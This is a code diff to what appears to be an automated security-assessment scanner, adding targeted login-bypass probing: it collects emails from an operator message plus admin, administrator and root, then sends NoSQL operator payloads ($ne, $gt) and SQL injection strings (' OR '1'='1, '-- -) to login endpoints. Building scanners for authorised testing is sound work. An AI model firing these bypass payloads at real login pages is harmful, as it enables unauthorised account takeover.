@@ -250,7 +250,8 @@ def _header_bypass(assessment_id, t, sandbox, root_html, log) -> bool:
 
 
 def login_authbypass_scan(assessment_id, inventory, sandbox, target, session_headers=None,
-                          log: Callable[[str], None] = lambda m: None, cap: int = 12) -> int:
+                          log: Callable[[str], None] = lambda m: None, cap: int = 12,
+                          message: str = "") -> int:
     """Fuzz the login endpoint(s) for SQL / NoSQL authentication bypass. Returns findings filed."""
     if sandbox is None:
         return 0
@@ -269,9 +270,10 @@ def login_authbypass_scan(assessment_id, inventory, sandbox, target, session_hea
         return 0
     root_html = (_req(sandbox, "GET", target).get("body") or "")[:60000]
     log(f"auth-bypass: fuzzing {len(targets)} login endpoint(s) for SQL/NoSQL bypass")
+    known_users = _known_users(message)
     filed = 0
     for t in targets:
-        if _probe_one(assessment_id, t, sandbox, log, root_html):
+        if _probe_one(assessment_id, t, sandbox, log, root_html, known_users):
             filed += 1
     if filed:
         log(f"auth-bypass: {filed} authentication bypass(es) confirmed")
@@ -290,7 +292,44 @@ def _field_pairs(t) -> list[tuple[str, str]]:
     return pairs
 
 
-def _probe_one(assessment_id, t, sandbox, log, root_html="") -> bool:
+_EMAIL = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
+_KNOWN_PF = "password"
+
+
+def _known_users(message: str) -> list[str]:
+    """Usernames worth a targeted password bypass: any email in the operator message, plus the
+    usual privileged accounts. A known user lets us bypass the PASSWORD check specifically
+    (operator-on-password / password SQLi) rather than only 'log in as the first row'."""
+    users = [m.group(0) for m in _EMAIL.finditer(message or "")]
+    users += ["admin", "administrator", "root"]
+    return list(dict.fromkeys(users))[:6]
+
+
+def _known_user_payloads(uf: str, user: str):
+    return [
+        (f"{uf}={user} {_KNOWN_PF}[$ne]=", {uf: user, _KNOWN_PF: {"$ne": ""}}),
+        (f"{uf}={user} {_KNOWN_PF}[$gt]=", {uf: user, _KNOWN_PF: {"$gt": ""}}),
+        (f"{uf}={user} {_KNOWN_PF}=' OR '1'='1", {uf: user, _KNOWN_PF: "' OR '1'='1"}),
+        (f"{uf}={user}'-- -", {uf: f"{user}'-- -", _KNOWN_PF: "owl"}),
+    ]
+
+
+def _known_user_bypass(assessment_id, url, sandbox, json_hdr, known_users, log) -> bool:
+    rnd = secrets.token_hex(4)
+    for user in known_users:
+        uf = "email" if "@" in user else "username"
+        base = _auth_signal(_req(sandbox, "POST", url, headers=json_hdr,
+            body=_json.dumps({uf: f"owl{rnd}", _KNOWN_PF: f"owl{rnd}"})))
+        for desc, obj in _known_user_payloads(uf, user):
+            if _auth_signal(_req(sandbox, "POST", url, headers=json_hdr,
+                                 body=_json.dumps(obj))) - base:
+                _file(assessment_id, url, f"known-user password bypass ({user})", desc,
+                      {"known-user"}, f"POST {url}\n{_json.dumps(obj)}")
+                return True
+    return False
+
+
+def _probe_one(assessment_id, t, sandbox, log, root_html="", known_users=()) -> bool:
     url, kind = t["url"], t["kind"]
 
     # cheap liveness: a real JSON login API answers a bad login with a non-HTML error; skip a
@@ -346,5 +385,8 @@ def _probe_one(assessment_id, t, sandbox, log, root_html="") -> bool:
                 _file(assessment_id, url, "NoSQL operator injection", f"{uf}={uobj} {pf}={pobj}",
                       gained, f"POST {url}\n{_json.dumps({uf: uobj, pf: pobj})}")
                 return True
+    # targeted: a KNOWN username (operator-supplied / common) with a bypassable password
+    if known_users and _known_user_bypass(assessment_id, url, sandbox, json_hdr, known_users, log):
+        return True
     # no credential-field injection worked — try a secret dev/backdoor HEADER
     return _header_bypass(assessment_id, t, sandbox, root_html, log)
